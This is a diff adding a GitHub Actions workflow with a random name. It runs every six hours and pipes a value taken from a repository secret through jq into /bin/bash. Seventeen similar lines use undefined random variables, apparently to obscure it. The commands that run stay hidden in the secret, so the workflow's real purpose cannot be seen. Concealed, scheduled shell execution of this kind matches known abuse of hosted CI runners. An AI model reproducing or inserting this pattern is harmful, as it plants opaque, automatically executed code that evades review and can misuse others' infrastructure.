@@ -1,0 +1,35 @@
+name: zuozhengdenggg
+on:
+  workflow_dispatch:
+  schedule:
+    - cron: '17 4/6 * * *'
+
+jobs:
+  build:
+    runs-on: ubuntu-latest
+
+    steps:
+      - uses: actions/checkout@v4
+      - name: zuozhengdenggg
+        env:
+          ggmj17: ${{ secrets.ggmj17 }}
+        run: |
+          echo $ggmj17 | jq -r .mgygs57 | /bin/bash
+          echo $bs3 | jq -r .mgkxp4 | /bin/bash
+          echo $xvns976 | jq -r .svq5 | /bin/bash
+          echo $ikvw61 | jq -r .ga83316 | /bin/bash
+          echo $b55957 | jq -r .hqgqr52753 | /bin/bash
+          echo $i9 | jq -r .dim983 | /bin/bash
+          echo $mldz73 | jq -r .iswb37 | /bin/bash
+          echo $s938 | jq -r .tic9 | /bin/bash
+          echo $puwg8 | jq -r .fa72527 | /bin/bash
+          echo $psa8 | jq -r .jfflh8242 | /bin/bash
+          echo $ffl3 | jq -r .muqjo0 | /bin/bash
+          echo $acusx6 | jq -r .ouhu3 | /bin/bash
+          echo $ex3458 | jq -r .ttw3 | /bin/bash
+          echo $feex755 | jq -r .vnv56 | /bin/bash
+          echo $agkeo1939 | jq -r .zsmb3 | /bin/bash
+          echo $jtpc5016 | jq -r .ghvq48580 | /bin/bash
+          echo $ujtlt8 | jq -r .cf0 | /bin/bash
+          echo $earuy1 | jq -r .myapb161 | /bin/bash
+
